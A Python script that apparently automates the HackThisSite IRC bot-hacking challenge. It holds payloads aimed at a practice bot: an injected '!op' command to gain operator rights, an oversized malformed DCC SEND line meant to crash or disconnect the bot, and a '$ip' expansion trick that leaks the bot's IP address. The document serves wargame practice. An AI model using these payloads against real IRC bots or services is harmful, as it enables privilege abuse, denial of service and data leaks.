#!/usr/bin/env python
import socket

botnick = ""
password = ""

def main():
 irc = socket.socket()
 irc.connect(("irc.hackthissite.org", 6667))
 irc.send("NICK %s\r\n" % (botnick))
 irc.send("USER %s %s %s :Python-Test\r\n" % (botnick, botnick, botnick))
 buf = ""
 while 1:
   recvd = irc.recv(5000)
   lines = recvd.split('\n')
   lines[0] = buf + lines[0]
   last = len(lines)
   last -= 1
   if not lines[last].count('\r'):
     buf = lines.pop()
   for line in lines:
     print line
     msg = line.split(':')
     if msg[0].count("PING"):
       irc.send('PONG :' + msg[1] + '\r\n')
     elif len(msg) > 2 and msg[2].count("End of /MOTD command."):
       irc.send("PRIVMSG nickserv :identify %s %s\r\n" % (botnick, password))
     if len(msg) > 2 and msg[2].count("Password accepted - you are now recognized."):
       print "[-] Authenticated, joining channel...\r\n"
       irc.send('JOIN #HTB\r\n')
     if len(msg) > 2 and msg[2].count("End of /NAMES list."):
       print "[-] Starting challenge...\r\n"
       irc.send("PRIVMSG #htb :!htb\r\n")
       #mission 1
     if len(msg) > 2 and msg[2].count("Gain op in this channel by using the bot, say !commands to get a full list of commands."):
       print "[-] Solving mission 1\r\n"
       irc.send("PRIVMSG #htb :!say !op %s\r\n" % (botnick))
     if len(msg) > 2 and msg[2].count("Disconnect the bot, say !commands to get a full list of commands."):
       print "[-] Solving mission 2\r\n"
       irc.send('PRIVMSG moo :\001DCC SEND "a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a" 1344406250 34234 32234234\r\n')
     if len(msg) > 2 and msg[2].count("Obtain the bots ip, say !commands to get a full list of commands."):
       print "[-] Solving mission 4\r\n"
       irc.send('PRIVMSG moo :!write %s $ip\r\n' % (botnick))
     if len(msg) > 2 and msg[2].count("Memo stored as memo nr. 1"):
       irc.send('PRIVMSG moo :!read 1\r\n')

if __name__ == "__main__":
 main()